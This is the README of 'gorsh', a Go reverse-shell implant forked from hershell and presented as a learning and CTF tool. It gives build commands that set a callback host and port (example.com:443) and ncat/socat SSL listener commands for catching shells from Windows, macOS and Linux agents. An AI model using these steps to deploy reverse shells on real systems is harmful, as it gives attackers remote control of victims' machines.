# gorsh

[go]lang [r]everse [sh]ell

![](https://i.imgur.com/x51XH6K.png)
![](https://i.imgur.com/pvCmHYa.png)

Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)

## Motivation

Learn go.  
Make a throwaway reverse shell for things like CTFs.  
Learn about host-based OPSEC considerations when writing an implant.

## Fork Changes

See the [Changelog](./docs/CHANGELOG.md)

## Project Notes

__NOTICE__: Requires go 1.11.

Also, the zStandard compression library in this project uses `cgo` and thus you'll need the mingw
compiler on Linux if you want to compile the Windows agents. It also only supports GOARCH=amd64, so
32-bit agents use a less efficient gzip algo.

## Getting started

Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
with Go and setting up your Golang environment (with the `$GOPATH` environment variable).

Make sure to read the Makefile. It gives you a good idea of what's going on.

Because this project uses `cgo` and tries to cross-compile for linux/windows/macos, you'll need a
windows compiler. I've only tried this on Debian, but since go1.11, you just need mingw installed.

```sh
sudo apt install gcc-mingw-w64 binutils-mingw-w64-x86-64 tmux socat
go get github.com/audibleblink/gorsh/...
GOOS=windows go get github.com/audibleblink/gorsh/...
cd $GOPATH/src/github.com/audibleblink/gorsh
```

While it is often required during cross-compilation to set variables like $CC, $CXX, $AS, $LD, ...
it is not required as go1.11 linux/amd64 picks up on the presence of the toolchain it needs.

### Usage

First, generate your certs:

```bash
$ make depends
```

For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.

Generate with:

```bash
$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
#or
$ make all LHOST=example.com LPOST=443
```

[Troubleshooting](./docs/TROUBLESHOOTING.md)


#### Catching the shell

The `make listen` target kicks off a tmux session and creates new windows with each new connection.
Feed it a port number as LPORT.

```sh
make listen LPORT=8080

# once a client connects
tmux attach -t GORSH
```

Shells can also be caught without tmux using:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

Once executed, you will be provided with the tool's shell.
Type `help` to show what commands are supported.

## Credits

* Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
* Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
* mzpqnxow for figuring out my x-compilation and dependancy problems and troubleshooting guide
